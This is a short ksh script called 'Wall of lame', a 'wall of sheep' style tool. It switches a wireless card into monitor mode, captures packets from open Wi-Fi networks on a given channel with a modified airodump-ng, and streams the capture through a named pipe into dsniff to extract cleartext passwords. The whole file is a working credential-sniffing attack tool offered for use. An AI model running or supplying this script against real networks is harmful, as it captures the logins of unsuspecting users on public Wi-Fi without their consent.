#!/usr/bin/env ksh

#.---------------------------------------------
#       (w|h)all of lame
#
#,---------------------------------------------

IFACE='wlan0'
FIFO='/tmp/whol_pipe'
STATUS=0


destruct() {
    if [[ "$STATUS" -gt 0 ]] ; then return; fi
    echo "exitting.."
    STATUS=$((STATUS+1))
    if [[ "$1" != "" ]] ; then kill $1; fi
    airmon-ng stop mon0
    rm $FIFO
}

usage() {
    echo -e "(W|H)all of lame - (C) 2010 Adam Tauber

    usage: whol <channel> <interface>[options] 
    Options:

        -c                  : Channel of open wifi networks [int]  
        -i                  : Wireless interface name [str]  
        -h                  : Displays this usage screen [void]  
        -q                  : Quiet mode (no output) [void]  
"
}

ARGS=`getopt -n whol -u -l channel:,help,quiet,interface c:i:hq $*`
if test $? != 0
     then
         usage
         exit 1
fi
set -- $ARGS
for i
do
  case "$i" in
        -c|--channel) shift; CHANNEL=$1; shift;;
        -q|--quiet) shift; QUIET=1;;
        -i|--interface) shift; IFACE=$1; shift;;
        -h|--help) shift; usage; exit 1;;
  esac
done


mkfifo $FIFO
airmon-ng start $IFACE 0

airodump-ng_wholmod -o pcap -w $FIFO -t OPN -c $CHANNEL mon0 -p -q&
APID=$!

trap "destruct $APID" INT

dsniff -m -p $FIFO

destruct $APID
